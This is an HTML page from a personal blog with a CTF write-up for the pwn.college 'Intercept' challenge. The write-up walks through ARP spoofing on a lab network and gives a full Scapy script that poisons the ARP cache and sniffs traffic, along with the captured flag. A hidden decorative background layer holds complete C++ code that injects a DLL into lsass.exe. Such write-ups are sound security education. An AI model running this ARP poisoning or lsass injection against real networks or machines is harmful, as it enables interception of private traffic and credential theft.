@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🛰️ Intercept – Writeup (pwn.college)</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="🛰️ Intercept – Writeup (pwn.college)" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>🛰️ Intercept – Writeup (pwn.college)</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-challenge-summary">📌 Challenge Summary</h2>
+
+<blockquote>
+  <p>Intercept traffic from a remote host.<br />
+The remote host at <code class="language-plaintext highlighter-rouge">10.0.0.2</code> is communicating with another host at <code class="language-plaintext highlighter-rouge">10.0.0.3</code> over port <code class="language-plaintext highlighter-rouge">31337</code>.<br />
+Your task is to <strong>intercept this communication</strong> and extract the flag — without modifying or directly interacting with the server.</p>
+</blockquote>
+
+<hr />
+
+<h2 id="-understanding-the-setup">🧠 Understanding the Setup</h2>
+
+<h3 id="network-layout">Network Layout:</h3>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">10.0.0.2</code> → Victim (sending/receiving sensitive data on port <code class="language-plaintext highlighter-rouge">31337</code>)</li>
+  <li><code class="language-plaintext highlighter-rouge">10.0.0.3</code> → Intended recipient (target of <code class="language-plaintext highlighter-rouge">10.0.0.2</code>’s communication)</li>
+  <li><code class="language-plaintext highlighter-rouge">10.0.0.1</code> → You, the attacker</li>
+</ul>
+
+<h3 id="objective">Objective:</h3>
+
+<ul>
+  <li>Traffic between <code class="language-plaintext highlighter-rouge">.2</code> and <code class="language-plaintext highlighter-rouge">.3</code> is not visible to you by default.</li>
+  <li>You must <strong>perform ARP spoofing</strong> to trick the victim into sending packets to <strong>your MAC</strong>, thinking it’s <code class="language-plaintext highlighter-rouge">.3</code>.</li>
+</ul>
+
+<hr />
+
+<h2 id="-how-we-exploit-it">🔍 How We Exploit It</h2>
+
+<h3 id="-challenge">🔒 Challenge:</h3>
+<ul>
+  <li>The victim at <code class="language-plaintext highlighter-rouge">10.0.0.2</code> only talks to <code class="language-plaintext highlighter-rouge">10.0.0.3</code>.</li>
+  <li>Packets don’t route through you.</li>
+  <li>You need to <strong>become a man-in-the-middle</strong>.</li>
+</ul>
+
+<h3 id="-solution">✅ Solution:</h3>
+<ul>
+  <li><strong>ARP poisoning</strong>: Send a forged ARP reply to <code class="language-plaintext highlighter-rouge">10.0.0.2</code>, saying “<code class="language-plaintext highlighter-rouge">10.0.0.3 is at my MAC address</code>”.</li>
+  <li>This makes <code class="language-plaintext highlighter-rouge">.2</code> send all <code class="language-plaintext highlighter-rouge">.3</code>-bound traffic <strong>to you instead</strong>.</li>
+  <li>Once you receive it, simply <strong>sniff the data</strong> and extract the flag.</li>
+</ul>
+
+<hr />
+
+<h2 id="-attack-plan">🧪 Attack Plan</h2>
+
+<ol>
+  <li><strong>Resolve the MAC</strong> of <code class="language-plaintext highlighter-rouge">10.0.0.2</code> using ARP.</li>
+  <li><strong>Send fake ARP replies</strong> repeatedly to <code class="language-plaintext highlighter-rouge">10.0.0.2</code>, claiming <code class="language-plaintext highlighter-rouge">10.0.0.3</code> is at your MAC.</li>
+  <li><strong>Sniff traffic</strong> using Scapy on port <code class="language-plaintext highlighter-rouge">31337</code>.</li>
+  <li><strong>Extract and print payloads</strong> from intercepted packets.</li>
+</ol>
+
+<hr />
+
+<h2 id="-final-exploit--correctcpy">💣 Final Exploit – <code class="language-plaintext highlighter-rouge">correctc.py</code></h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="n">threading</span>
+<span class="kn">import</span> <span class="n">time</span>
+
+<span class="n">victim_ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.2</span><span class="sh">'</span>
+<span class="n">spoof_ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.3</span><span class="sh">'</span>
+<span class="n">iface</span> <span class="o">=</span> <span class="sh">'</span><span class="s">eth0</span><span class="sh">'</span>  <span class="c1"># Use appropriate interface
+</span>
+<span class="k">def</span> <span class="nf">get_mac</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
+    <span class="n">ans</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="nf">sr</span><span class="p">(</span><span class="nc">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="n">ip</span><span class="p">),</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">retry</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">sent</span><span class="p">,</span> <span class="n">rec</span> <span class="ow">in</span> <span class="n">ans</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">rec</span><span class="p">.</span><span class="n">hwsrc</span>
+    <span class="k">return</span> <span class="bp">None</span>
+
+<span class="k">def</span> <span class="nf">poison</span><span class="p">(</span><span class="n">victim_ip</span><span class="p">,</span> <span class="n">spoof_ip</span><span class="p">):</span>
+    <span class="n">victim_mac</span> <span class="o">=</span> <span class="nf">get_mac</span><span class="p">(</span><span class="n">victim_ip</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">victim_mac</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[!] Error: MAC for </span><span class="si">{</span><span class="n">victim_ip</span><span class="si">}</span><span class="s"> not found.</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="n">arp_poison</span> <span class="o">=</span> <span class="nc">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">pdst</span><span class="o">=</span><span class="n">victim_ip</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="n">victim_mac</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="n">spoof_ip</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Starting ARP Poison: </span><span class="si">{</span><span class="n">victim_ip</span><span class="si">}</span><span class="s"> &lt;- </span><span class="si">{</span><span class="n">spoof_ip</span><span class="si">}</span><span class="s"> is at OUR MAC</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="nf">send</span><span class="p">(</span><span class="n">arp_poison</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="n">iface</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+        <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">sniffing</span><span class="p">():</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Starting to sniff packets...</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">handler</span><span class="p">(</span><span class="n">pkt</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">pkt</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="n">Raw</span><span class="p">):</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">].</span><span class="n">load</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="sh">'</span><span class="s">ignore</span><span class="sh">'</span><span class="p">)</span>
+                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Intercepted: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+            <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                <span class="k">pass</span>
+
+    <span class="nf">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="sh">'</span><span class="s">tcp and port 31337</span><span class="sh">'</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="n">iface</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">handler</span><span class="p">,</span> <span class="n">store</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="c1"># Create and start threads
+</span><span class="n">poison_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">poison</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">victim_ip</span><span class="p">,</span> <span class="n">spoof_ip</span><span class="p">))</span>
+<span class="n">sniff_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">sniffing</span><span class="p">)</span>
+
+<span class="n">poison_thread</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+<span class="n">sniff_thread</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+</code></pre></div></div>
+<h3 id="output">Output</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Starting to sniff packets...
+<span class="o">[</span>+] Starting ARP Poison: 10.0.0.2 &lt;- 10.0.0.3 is at OUR MAC
+
+<span class="o">[</span>+] Intercepted: pwn.college<span class="o">{</span>ICmDbqZFGWJpgfbWt_tHbUDJt6J.QXxczMzwSM0IzMyEzW<span class="o">}</span>
+<span class="o">[</span>+] Intercepted: pwn.college<span class="o">{</span>ICmDbqZFGWJpgfbWt_tHbUDJt6J.QXxczMzwSM0IzMyEzW<span class="o">}</span>
+<span class="o">[</span>+] Intercepted: pwn.college<span class="o">{</span>ICmDbqZFGWJpgfbWt_tHbUDJt6J.QXxczMzwSM0IzMyEzW<span class="o">}</span>
+...
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="flag">Flag</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college{ICmDbqZFGWJpgfbWt_tHbUDJt6J.QXxczMzwSM0IzMyEzW}
+</code></pre></div></div>
+<hr />
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
